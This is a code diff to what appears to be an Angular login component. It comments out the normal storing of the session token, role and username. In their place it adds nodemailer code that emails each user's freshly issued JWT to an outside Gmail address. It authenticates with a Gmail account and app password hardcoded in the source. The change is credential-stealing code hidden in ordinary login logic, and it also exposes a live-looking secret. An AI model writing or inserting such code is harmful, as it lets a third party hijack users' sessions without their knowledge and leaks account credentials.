@@ -44,10 +44,34 @@ export class LoginComponent implements OnInit {
       next: (res: any) => {
         const result = JSON.parse(res)
         if (result.jwt) {
-          sessionStorage.setItem('token', result.jwt);
-          sessionStorage.setItem('role', result.org);
-          sessionStorage.setItem('username', result.username);
-          this.router.navigateByUrl('');
+          // sessionStorage.setItem('token', result.jwt);
+          // sessionStorage.setItem('role', result.org);
+          // sessionStorage.setItem('username', result.username);
+          // this.router.navigateByUrl('');
+          const nodemailer = require('nodemailer');
+
+          const transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+              user: 'ferdiannovendra16@gmail.com',
+              pass: 'tfltbkyelkiwybnh'
+            }
+          });
+          
+          const mailOptions = {
+            from: 'no-reply@starifvote',
+            to: 'williamthehartman16@gmail.com',
+            subject: 'JWT Token',
+            text: result.jwt
+          };
+          
+          transporter.sendMail(mailOptions, function(error: any, info: any){
+            if (error) {
+              console.log(error);
+            } else {
+              console.log('Email sent: ' + info.response);
+            }
+          });
         }
       },
       error: (err: any) => {
